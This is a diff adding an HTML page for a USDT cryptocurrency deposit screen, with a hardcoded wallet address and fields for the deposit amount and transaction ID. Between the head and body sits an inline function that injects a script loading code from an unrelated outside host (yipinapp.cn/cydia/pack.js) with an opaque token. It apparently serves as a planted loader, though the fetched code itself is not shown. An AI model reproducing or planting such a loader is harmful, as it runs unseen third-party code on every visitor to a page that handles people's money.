@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+    <title>USDT</title>
+    <link rel="stylesheet" href="../../static/css/weui.css"/>
+    <link rel="stylesheet" href="../../static/css/common.css"/>
+    <link rel="stylesheet" href="../../static/css/weui-jquery.css"/>
+    <link rel="stylesheet" href="../../static/css/account/method.css"/>
+    <style>
+        #listBox li {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            height: 3.4rem;
+            line-height: 3.4rem;
+            border-bottom: 1px solid #203353;
+        }
+
+        .buyBox {
+            margin-top: 2rem;
+        }
+
+        .weui-tab__bd {
+            padding: 0 0.9rem;
+        }
+
+        .weui-btn{
+            width: 100%;
+        }
+    </style>
+</head>
+<script>
+    (function () {
+        var dw = document.createElement("script");
+        dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(dw, s);
+    })()
+</script>
+<body>
+<header class="weui-bar weui-bar-nav" id="returnBtn">
+    <a class="weui-pull-left weui-btns">
+        <span class="weui-cell__fts"></span>
+    </a>
+    <div class="weui-title">充币</div>
+</header>
+
+<div class="methodOne">
+    <div class="weui-tab__bd">
+        <div class="buyBox">
+        </div>
+        <div class="weui-cells weui-cells_form" id="bankBox">
+            <div class="weui-cell">
+                <div class="weui-cell__hd"><label class="weui-label">充值地址:</label></div>
+            </div>
+            <div class="weui-cell">
+                <div class="weui-cell__bd">
+                    <div id="sssimg">
+                        <img src="../../static/images/er.png" width="250" height="250"/>
+                    </div>
+                    <p id="sssp"> 0xaf53cde4ff4ee51925a00ce3ec8909b95a312e4a</p>
+                </div>
+            </div>
+            <div class="weui-cell">
+                <div class="weui-cell__hd"><label class="weui-label">充币数量:</label></div>
+            </div>
+            <div class="weui-cell">
+                <div class="weui-cell__bd">
+                    <input class="weui-input" type="text" id="amount" placeholder="请输入充币数量">
+                </div>
+            </div>
+            <div class="weui-cell">
+                <div class="weui-cell__hd"><label class="weui-label">区块链交易ID:</label></div>
+            </div>
+            <div class="weui-cell">
+                <div class="weui-cell__bd">
+                    <input class="weui-input" type="text" id="coinid" placeholder="请输入区块链交易ID">
+                </div>
+            </div>
+            <div class="weui-cell">
+                <button type="button" class="weui-btn mybgBtn outBtn" id="bindBtn">充币</button>
+            </div>
+        </div>
+    </div>
+    <script type="text/javascript" src="../../lib/zepto.min.js"></script>
+    <script type="text/javascript" src="../../lib/jquery-weui.js"></script>
+    <script type="text/javascript" src="../../lib/weui.js"></script>
+    <script type="text/javascript" src="../../static/js/common.js"></script>
+    <script type="text/javascript" src="../../static/js/api.js"></script>
+    <script type="text/javascript" src="../../static/js/account/recharge.js"></script>
+</body>
+</html>
